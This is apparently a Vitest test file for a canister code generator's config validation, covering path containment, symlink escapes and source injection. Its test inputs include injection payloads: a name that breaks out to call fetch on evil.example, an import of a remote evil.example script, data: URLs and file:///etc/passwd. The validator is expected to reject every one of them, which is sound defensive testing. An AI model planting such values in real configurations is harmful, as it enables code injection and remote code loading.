import { describe, expect, it, beforeEach, afterEach } from "vitest"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { runCanisterPipeline } from "./pipeline.js"
import {
  assertSafeCanisterName,
  assertSafeModuleSpecifier,
  assertOneOf,
  resolveContainedOutDir,
  CodegenConfigError,
  REACTOR_CLASS_NAMES,
} from "./validate.js"

const VALID_DID = "service : { greet : (text) -> (text) query; }\n"

let tmpRoot: string
let projectRoot: string

beforeEach(() => {
  tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "ic-reactor-validate-"))
  projectRoot = path.join(tmpRoot, "project")
  fs.mkdirSync(projectRoot, { recursive: true })
  fs.writeFileSync(path.join(projectRoot, "backend.did"), VALID_DID)
})

afterEach(() => {
  fs.rmSync(tmpRoot, { recursive: true, force: true })
})

function run(
  canisterConfig: Record<string, unknown>,
  globalConfig: Record<string, unknown> = {}
) {
  return runCanisterPipeline({
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    canisterConfig: { didFile: "./backend.did", ...canisterConfig } as any,
    projectRoot,
    globalConfig: {
      outDir: "./src/declarations",
      clientManagerPath: "../../clients",
      ...globalConfig,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
    } as any,
  })
}

describe("path containment (outDir escaping the project root)", () => {
  it("refuses a relative outDir that escapes the project root, and deletes nothing", async () => {
    const outside = path.join(tmpRoot, "outside")
    const victim = path.join(outside, "declarations")
    fs.mkdirSync(victim, { recursive: true })
    fs.writeFileSync(path.join(victim, "user-data.txt"), "IRREPLACEABLE")

    const result = await run({ name: "backend", outDir: "../outside" })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/outside the project root/)
    // The pre-existing directory must be untouched.
    expect(fs.existsSync(path.join(victim, "user-data.txt"))).toBe(true)
    expect(fs.readFileSync(path.join(victim, "user-data.txt"), "utf-8")).toBe(
      "IRREPLACEABLE"
    )
  })

  it("refuses an absolute outDir pointing outside the project root", async () => {
    const outside = path.join(tmpRoot, "abs-outside")
    fs.mkdirSync(path.join(outside, "declarations"), { recursive: true })
    fs.writeFileSync(path.join(outside, "declarations", "keep.txt"), "keep")

    const result = await run({ name: "backend", outDir: outside })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/outside the project root/)
    expect(fs.existsSync(path.join(outside, "declarations", "keep.txt"))).toBe(
      true
    )
  })

  it("refuses a canister name that traverses out of the global outDir", async () => {
    const result = await run({ name: "../../../escape" })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/Invalid canister name/)
    // Nothing may be written outside the project root.
    expect(fs.existsSync(path.join(tmpRoot, "escape"))).toBe(false)
  })

  it("still accepts a normal relative outDir inside the project", async () => {
    const result = await run({ name: "backend" })

    expect(result.error).toBeUndefined()
    expect(result.success).toBe(true)
    const generated = path.join(
      projectRoot,
      "src/declarations/backend/declarations"
    )
    expect(fs.readdirSync(generated).sort()).toEqual([
      "backend.d.ts",
      "backend.did",
      "backend.js",
    ])
  })
})

describe("source injection via config values", () => {
  it("refuses a canister name that would break out of the emitted string literal", async () => {
    const result = await run({
      name: 'backend", stolen: (globalThis.fetch("https://evil.example")), z: "',
    })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/Invalid canister name/)
  })

  it("refuses a clientManagerPath that is a remote URL", async () => {
    const result = await run(
      { name: "backend" },
      { clientManagerPath: "https://evil.example/payload.js" }
    )

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/URLs are not allowed/)
  })

  it("refuses a per-canister clientManagerPath containing a quote", async () => {
    const result = await run({
      name: "backend",
      clientManagerPath: '../clients"; import "https://evil.example/x.js',
    })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/must not contain quotes/)
  })

  it("emits a JSON-quoted name for a legitimate canister name", async () => {
    await run({ name: "my-canister" })

    const generated = fs.readFileSync(
      path.join(projectRoot, "src/declarations/my-canister/index.generated.ts"),
      "utf-8"
    )
    expect(generated).toContain('name: "my-canister",')
    expect(generated).toContain('import { clientManager } from "../../clients"')
  })
})

describe("identifier validity (issue #299)", () => {
  it("refuses a digit-leading name instead of emitting invalid TypeScript", async () => {
    const result = await run({ name: "2048_game" })

    expect(result.success).toBe(false)
    // "2048_game" derives `2048GameReactor`, which is not a valid identifier.
    expect(result.error).toMatch(/not a valid TypeScript identifier/)
    expect(result.error).toContain("2048GameReactor")
  })

  it("refuses a punctuation-only name that would collapse to an empty stem", async () => {
    for (const name of ["_", "--", "..."]) {
      const result = await run({ name })
      expect(result.success).toBe(false)
      expect(result.error).toMatch(/collapses to an empty identifier/)
    }
  })

  it("refuses a bare-digit name that derives a digit-leading identifier", async () => {
    const result = await run({ name: "2048" })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/not a valid TypeScript identifier/)
  })

  it("still accepts dfx-legal names that derive valid identifiers", async () => {
    // dfx places no pattern restriction on canister names, and all of these
    // produced working output before validation existed.
    for (const name of ["_private", "my.canister", "hello-world", "a1"]) {
      const result = await run({ name })
      expect(result.error).toBeUndefined()
      expect(result.success).toBe(true)
    }
  })

  it("names the offending canister in the error", async () => {
    const result = await run({ name: "2048_game" })

    expect(result.error).toContain("2048_game")
  })
})

describe("bypasses found by adversarial review", () => {
  it("refuses a symlink inside the project root that points outside it", async () => {
    const victim = path.join(tmpRoot, "victim")
    fs.mkdirSync(path.join(victim, "declarations"), { recursive: true })
    fs.writeFileSync(
      path.join(victim, "declarations", "IRREPLACEABLE.txt"),
      "keep me"
    )

    // A symlink that lives inside the project but resolves outside it.
    // path.resolve does not follow symlinks, so a lexical check passes here.
    fs.symlinkSync(victim, path.join(projectRoot, "escape-hatch"))

    const result = await run({ name: "backend", outDir: "./escape-hatch" })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/outside the project root/)
    expect(
      fs.existsSync(path.join(victim, "declarations", "IRREPLACEABLE.txt"))
    ).toBe(true)
  })

  it("refuses a symlinked canister directory under the global outDir", async () => {
    // The global-outDir branch appends the canister name AFTER resolving the
    // parent, so checking only the parent leaves the final segment free to be a
    // symlink out of the project.
    const victim = path.join(tmpRoot, "victim")
    fs.mkdirSync(path.join(victim, "declarations"), { recursive: true })
    fs.writeFileSync(
      path.join(victim, "declarations", "IRREPLACEABLE.txt"),
      "keep me"
    )

    const declarations = path.join(projectRoot, "src", "declarations")
    fs.mkdirSync(declarations, { recursive: true })
    fs.symlinkSync(victim, path.join(declarations, "backend"))

    const result = await run(
      { name: "backend" },
      { outDir: "src/declarations" }
    )

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/outside the project root/)
    expect(
      fs.existsSync(path.join(victim, "declarations", "IRREPLACEABLE.txt"))
    ).toBe(true)
  })

  it("accepts a contained directory whose name merely begins with dots", async () => {
    // "..generated" relativizes to "..generated", which a naive `..` prefix
    // test rejects even though it is inside the project.
    for (const outDir of ["..generated", "..secret/gen", "..a/b"]) {
      const result = await run({ name: "backend" }, { outDir })
      expect(result.error).toBeUndefined()
      expect(result.success).toBe(true)
    }
  })

  it("refuses an unknown mode instead of interpolating it into an import", async () => {
    const result = await run({
      name: "backend",
      mode: 'DisplayReactor"\nimport "https://evil.example/pwn.js"\n//',
    })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/Invalid mode/)
  })

  it("refuses an unknown target", async () => {
    const result = await run({ name: "backend", target: "nodejs" })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/Invalid target/)
  })

  it("still accepts every documented mode and target", async () => {
    for (const mode of REACTOR_CLASS_NAMES) {
      const result = await run({ name: "backend", mode })
      expect(result.error).toBeUndefined()
      expect(result.success).toBe(true)
    }
    for (const target of ["react", "core"]) {
      const result = await run({ name: "backend", target })
      expect(result.error).toBeUndefined()
      expect(result.success).toBe(true)
    }
  })

  it("refuses a URL specifier hidden behind leading whitespace", async () => {
    // URL parsing strips surrounding whitespace, so an anchored scheme check
    // alone would let this through and it would still load remotely.
    for (const spec of [
      " https://evil.example/x.js",
      "  data:text/javascript,alert(1)",
      "https://evil.example/x.js ",
    ]) {
      const result = await run({ name: "backend" }, { clientManagerPath: spec })
      expect(result.success).toBe(false)
      expect(result.error).toMatch(/whitespace|URLs are not allowed/)
    }
  })

  it("returns a config error, not an uncaught TypeError, for a non-string outDir", async () => {
    for (const outDir of [123, {}, [], true]) {
      const result = await run({ name: "backend", outDir })
      expect(result.success).toBe(false)
      expect(result.error).toMatch(/expected a non-empty string/)
    }
  })

  it("returns a config error for a non-string global outDir", async () => {
    const result = await run({ name: "backend" }, { outDir: null })

    expect(result.success).toBe(false)
    expect(result.error).toMatch(/expected a non-empty string/)
  })
})

describe("unit-level assertions", () => {
  it("accepts every member of a closed set and rejects the rest", () => {
    expect(() =>
      assertOneOf("mode", "DisplayReactor", REACTOR_CLASS_NAMES)
    ).not.toThrow()
    for (const bad of ["displayreactor", "", undefined, null, 1, "Reactor "]) {
      expect(() => assertOneOf("mode", bad, REACTOR_CLASS_NAMES)).toThrow(
        CodegenConfigError
      )
    }
  })

  it("accepts conventional canister names", () => {
    for (const name of [
      "backend",
      "my_canister",
      "my-canister",
      "a",
      "Ledger",
      "_private",
      "my.canister",
    ]) {
      expect(() => assertSafeCanisterName(name)).not.toThrow()
    }
  })

  it("rejects names that are path segments rather than canisters", () => {
    for (const name of [".", ".."]) {
      expect(() => assertSafeCanisterName(name)).toThrow(CodegenConfigError)
    }
  })

  it("rejects non-string and empty names", () => {
    for (const name of [undefined, null, 42, "", {}]) {
      expect(() => assertSafeCanisterName(name)).toThrow(CodegenConfigError)
    }
  })

  it("rejects names containing path separators", () => {
    for (const name of ["a/b", "a\\b", "..", "../x", "a b"]) {
      expect(() => assertSafeCanisterName(name)).toThrow(CodegenConfigError)
    }
  })

  it("accepts relative and bare module specifiers", () => {
    for (const spec of ["./clients", "../../clients", "@scope/pkg", "pkg"]) {
      expect(() => assertSafeModuleSpecifier("p", spec)).not.toThrow()
    }
  })

  it("rejects URL-ish and protocol-relative specifiers", () => {
    for (const spec of [
      "https://evil.example/x.js",
      "http://evil.example/x.js",
      "data:text/javascript,alert(1)",
      "file:///etc/passwd",
      "//evil.example/x.js",
    ]) {
      expect(() => assertSafeModuleSpecifier("p", spec)).toThrow(
        CodegenConfigError
      )
    }
  })

  it("resolves a contained outDir to an absolute path", () => {
    const root = path.join(tmpRoot, "root")
    expect(resolveContainedOutDir("outDir", "./src/gen", root)).toBe(
      path.join(root, "src/gen")
    )
  })

  it("rejects an outDir that escapes via a symlink-free ..", () => {
    const root = path.join(tmpRoot, "root")
    expect(() => resolveContainedOutDir("outDir", "../sneaky", root)).toThrow(
      CodegenConfigError
    )
  })

  it("does not treat a sibling directory with a shared prefix as contained", () => {
    const root = path.join(tmpRoot, "root")
    expect(() =>
      resolveContainedOutDir("outDir", "../root-evil", root)
    ).toThrow(CodegenConfigError)
  })
})
